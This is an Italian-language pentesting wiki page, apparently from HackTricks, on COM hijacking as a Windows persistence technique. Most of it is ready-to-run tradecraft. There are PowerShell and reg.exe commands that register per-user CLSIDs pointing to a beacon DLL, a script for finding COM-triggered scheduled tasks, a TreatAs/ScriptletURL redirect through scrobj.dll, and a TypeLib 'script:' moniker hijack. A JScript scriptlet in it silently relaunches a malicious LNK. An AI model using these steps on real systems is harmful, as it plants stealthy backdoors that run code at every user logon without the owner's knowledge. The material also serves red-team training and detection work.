# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Ricerca di componenti COM inesistenti

Poiché i valori di HKCU possono essere modificati dagli utenti, **COM Hijacking** può essere usato come **meccanismo di persistenza**. Usando `procmon` è facile trovare registri COM cercati che non esistono ancora e che potrebbero essere creati da un attacker. Filtri classici:

- **RegOpenKey** operations.
- where the _Result_ is **NAME NOT FOUND**.
- and the _Path_ ends with **InprocServer32**.

Variazioni utili durante il hunting:

- Cerca anche chiavi **`LocalServer32`** mancanti. Alcune classi COM sono out-of-process server e avvieranno un EXE controllato dall'attaccante invece di una DLL.
- Cerca operazioni di registro `TreatAs` e `ScriptletURL` oltre a `InprocServer32`. Contenuti di detection recenti e writeup di malware continuano a segnalarli perché sono molto più rari rispetto alle registrazioni COM normali e quindi ad alto segnale.
- Copia il legittimo `ThreadingModel` dalla voce originale `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` quando cloni una registrazione in HKCU. Usare il modello sbagliato spesso rompe l'attivazione e rende il hijack rumoroso.
- Su sistemi 64-bit ispeziona sia le viste 64-bit che 32-bit (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` and `HKLM\Software\Classes\WOW6432Node`) perché le applicazioni a 32-bit potrebbero risolvere una registrazione COM diversa.

Una volta deciso quale COM inesistente impersonare, esegui i comandi seguenti. _Fai attenzione se decidi di impersonare un COM che viene caricato ogni pochi secondi, potrebbe essere eccessivo._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Componenti COM hijackabili del Task Scheduler

Le Windows Tasks usano Custom Triggers per invocare oggetti COM e, poiché vengono eseguite tramite il Task Scheduler, è più facile prevedere quando verranno attivate.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Controllando l'output puoi selezionare, per esempio, una che verrà eseguita **ogni volta che un utente effettua il login**.

Cercando ora il CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** in **HKEY\CLASSES\ROOT\CLSID** e in HKLM e HKCU, di solito si scopre che il valore non esiste in HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Poi, puoi semplicemente creare la voce HKCU e ogni volta che l'utente effettua il login, la tua backdoor verrà eseguita.

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` permette a un CLSID di essere emulato da un altro. Dal punto di vista offensivo questo significa che puoi lasciare il CLSID originale intatto, creare un secondo CLSID per utente che punti a `scrobj.dll`, e poi reindirizzare il vero oggetto COM a quello malevolo con `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Questo è utile quando:

- l'applicazione target già istanzia un CLSID stabile al logon o all'avvio dell'app
- vuoi un reindirizzamento soltanto nel registro invece di sostituire l'originale `InprocServer32`
- vuoi eseguire uno scriptlet `.sct` locale o remoto tramite il valore `ScriptletURL`

Esempio di workflow (adattato dal tradecraft pubblico di Atomic Red Team e da ricerche più vecchie sull'abuso del registro COM):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Note:

- `scrobj.dll` legge il valore `ScriptletURL` ed esegue il `.sct` referenziato, quindi puoi mantenere il payload come file locale o prelevarlo da remoto via HTTP/HTTPS.
- `TreatAs` è particolarmente utile quando la registrazione COM originale è completa e stabile in HKLM, perché serve solo un piccolo reindirizzamento per utente invece di replicare l'intero albero.
- Per una validazione senza attendere il trigger naturale, puoi instanziare il ProgID/CLSID falso manualmente con `rundll32.exe -sta <ProgID-or-CLSID>` se la classe target supporta l'attivazione STA.

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) definiscono le interfacce COM e vengono caricate tramite `LoadTypeLib()`. Quando un COM server viene istanziato, l'OS può anche caricare il TypeLib associato consultando le chiavi di registro sotto `HKCR\TypeLib\{LIBID}`. Se il percorso del TypeLib è sostituito con un **moniker**, ad es. `script:C:\...\evil.sct`, Windows eseguirà lo scriptlet quando il TypeLib viene risolto — generando una persistenza stealth che si attiva quando componenti comuni vengono toccati.

Questo è stato osservato contro il Microsoft Web Browser control (spesso caricato da Internet Explorer, da app che incorporano WebBrowser e persino da `explorer.exe`).

### Passaggi (PowerShell)

1) Identifica il TypeLib (LIBID) usato da un CLSID ad alta frequenza. Esempio di CLSID spesso abusato dalle catene di malware: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Indirizzare il percorso TypeLib per utente a uno scriptlet locale usando il moniker `script:` (non sono necessari diritti di amministratore):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Deposita un JScript minimale `.sct` che rilancia il tuo payload principale (ad es. un `.lnk` usato dalla catena iniziale):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Attivazione – l'apertura di IE, di un'applicazione che incorpora il WebBrowser control, o anche la normale attività di Explorer caricherà il TypeLib ed eseguirà lo scriptlet, riarmando la tua catena al logon/reboot.

Pulizia
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Note
- È possibile applicare la stessa logica ad altri componenti COM ad alta frequenza; risolvere sempre prima il vero `LIBID` da `HKCR\CLSID\{CLSID}\TypeLib`.
- Su sistemi 64-bit è inoltre possibile popolare la sottochiave `win64` per i client a 64-bit.

## Riferimenti

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
